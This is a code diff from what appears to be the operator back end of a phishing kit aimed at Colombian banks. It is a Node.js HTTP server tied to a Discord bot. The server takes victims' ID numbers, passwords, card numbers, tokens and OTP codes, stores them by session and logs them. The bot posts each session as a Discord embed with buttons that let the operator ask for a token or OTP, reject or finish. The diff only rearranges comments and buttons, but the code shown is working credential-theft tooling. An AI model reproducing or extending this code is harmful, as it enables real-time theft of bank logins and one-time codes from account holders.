@@ -13,7 +13,6 @@ const HTTP_PORT = process.env.PORT || 3000;
 // ESTADO DE LAS SESIONES
 // ============================================
 const estadoSesiones = new Map();
-// Datos completos de cada sesión (identificacion, clave, tipo, etc.)
 const datosSesiones = new Map();
 
 // ============================================
@@ -39,7 +38,7 @@ client.once(Events.ClientReady, (c) => {
 // HELPERS — Construir embeds y botones
 // ============================================
 
-// Embed inicial (cédula + contraseña)
+// Embed inicial (cédula + clave)
 function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
     const { tipo, tipoDoc, identificacion, clave, tarjeta } = datos;
 
@@ -62,7 +61,7 @@ function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
     return embed;
 }
 
-// Embed del TOKEN (cédula + clave + token)
+// Embed del TOKEN
 function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
     const { tipoDoc, identificacion, clave } = datos;
 
@@ -85,7 +84,7 @@ function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
     return embed;
 }
 
-// Embed del OTP (cédula + clave + otp)
+// Embed del OTP
 function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
     const { tipoDoc, identificacion, clave } = datos;
 
@@ -110,9 +109,8 @@ function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
 
 // Botones del embed INICIAL
 // - Bogotá: 2 botones (Token / Rechazar)
-// - Todos los demás: 3 botones (Rechazar / OTP / Token)
+// - Todos los demás: 2 botones (Rechazar / OTP)
 function buildButtonsInicial(bancoKey, sessionId) {
-    // Bogotá: 2 botones
     if (bancoKey === 'bogota') {
         return new ActionRowBuilder().addComponents(
             new ButtonBuilder()
@@ -126,7 +124,7 @@ function buildButtonsInicial(bancoKey, sessionId) {
         );
     }
 
-    // Todos los demás bancos: 3 botones
+    // Todos los demás bancos: 2 botones (Rechazar / OTP)
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
@@ -135,11 +133,7 @@ function buildButtonsInicial(bancoKey, sessionId) {
         new ButtonBuilder()
             .setCustomId(`OTP|${bancoKey}|${sessionId}`)
             .setLabel('📱 OTP')
-            .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-            .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
-            .setLabel('🔢 Token')
-            .setStyle(ButtonStyle.Success)
+            .setStyle(ButtonStyle.Primary)
     );
 }
 
@@ -161,21 +155,17 @@ function buildButtonsToken(bancoKey, sessionId) {
     );
 }
 
-// Botones del embed OTP: Finalizar / Token / Rechazar
+// Botones del embed OTP: Rechazar / Finalizar (2 botones)
 function buildButtonsOtp(bancoKey, sessionId) {
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
-            .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
-            .setLabel('✅ Finalizar')
-            .setStyle(ButtonStyle.Success),
-        new ButtonBuilder()
-            .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
-            .setLabel('🔢 Token')
-            .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
             .setLabel('❌ Rechazar')
-            .setStyle(ButtonStyle.Danger)
+            .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+            .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
+            .setLabel('✅ Finalizar')
+            .setStyle(ButtonStyle.Success)
     );
 }
 
@@ -262,13 +252,10 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Recuperar datos de la sesión original
                 const datosOriginales = datosSesiones.get(sessionId) || {};
-                // Actualizar con el token nuevo
                 const datosCompletos = Object.assign({}, datosOriginales, { token });
                 datosSesiones.set(sessionId, datosCompletos);
 
-                // Estado: token
                 estadoSesiones.set(sessionId, 'token');
                 console.log(`🔢 [${bancoKey}] Token recibido: ${sessionId} → ${token}`);
 
